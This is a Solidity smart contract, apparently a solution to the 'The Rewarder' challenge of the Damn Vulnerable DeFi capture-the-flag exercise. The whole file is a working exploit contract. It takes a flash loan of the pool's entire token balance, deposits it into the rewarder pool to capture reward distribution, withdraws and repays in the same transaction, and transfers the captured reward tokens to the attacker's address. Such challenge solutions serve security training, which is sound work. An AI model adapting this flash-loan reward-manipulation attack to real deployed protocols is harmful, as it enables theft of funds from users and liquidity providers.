pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract TheRewarderAttacker  {

    using Address for address payable;

    FlashLoanerPool flashPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken token;
    RewardToken rewardToken;
    address attacker;

    constructor(FlashLoanerPool _flashPool, TheRewarderPool _pool, DamnValuableToken _token, RewardToken _rewardToken) public {
        flashPool = _flashPool;
        rewarderPool = _pool;
        token = _token;
        rewardToken = _rewardToken;
        attacker = msg.sender;
    }

    function attack() external {
        // Take all balance from flash loan
        uint256 balance = token.balanceOf(address(flashPool));
        flashPool.flashLoan(balance);
        
        // Send rewards to attacker
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, rewardBalance);
    }

    function receiveFlashLoan(uint256 amount) public {
        // Deposit flash loan into de rewarder pool
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // Withdraw the flash loan deposit and return it to flash loan contract
        rewarderPool.withdraw(amount);
        token.transfer(address(flashPool), amount);
    }
}